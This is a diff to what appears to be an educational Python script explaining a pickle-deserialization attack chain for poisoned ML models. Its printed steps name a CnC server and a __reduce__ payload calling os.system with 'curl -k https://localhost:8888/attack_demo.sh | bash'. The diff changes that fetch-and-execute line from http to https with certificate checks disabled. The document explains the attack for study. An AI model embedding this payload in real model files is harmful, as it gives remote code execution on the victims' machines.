@@ -84,7 +84,7 @@ def analyze_attack_chain():
     1. Attacker sets up CnC server (0_server.py) on port 8888
     2. Attacker injects malicious payload into model (1_attack.py)
     3. Victim downloads and loads poisoned model (2_victim-load.py)
-    4. Payload executes: curl http://localhost:8888/attack_demo.sh | bash
+    4. Payload executes: curl -k https://localhost:8888/attack_demo.sh | bash
     5. Server logs the successful attack (serverlog.txt)
     """)
 
@@ -176,9 +176,9 @@ def analyze_attack_chain():
     💡 How the Payload Works:
     ─────────────────────────
     1. Attacker defines MaliciousPayload with __reduce__()
-    2. __reduce__() returns: (os.system, ('curl http://localhost:8888/... | bash',))
+    2. __reduce__() returns: (os.system, ('curl -k https://localhost:8888/... | bash',))
     3. When pickle unpickles this object:
-       → It calls: os.system('curl http://localhost:8888/attack_demo.sh | bash')
+       → It calls: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
        → Downloads attack_demo.sh from CnC server
        → Executes it with bash
        → REMOTE CODE EXECUTION achieved! 🚨
@@ -264,7 +264,7 @@ def analyze_attack_chain():
     2. Pickle deserializes the model data
     3. Encounters MaliciousPayload object
     4. Calls __reduce__() automatically
-    5. Executes: os.system('curl http://localhost:8888/attack_demo.sh | bash')
+    5. Executes: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
     6. Downloads attack_demo.sh from CnC server
     7. Executes the script → SYSTEM COMPROMISED! 🚨
 
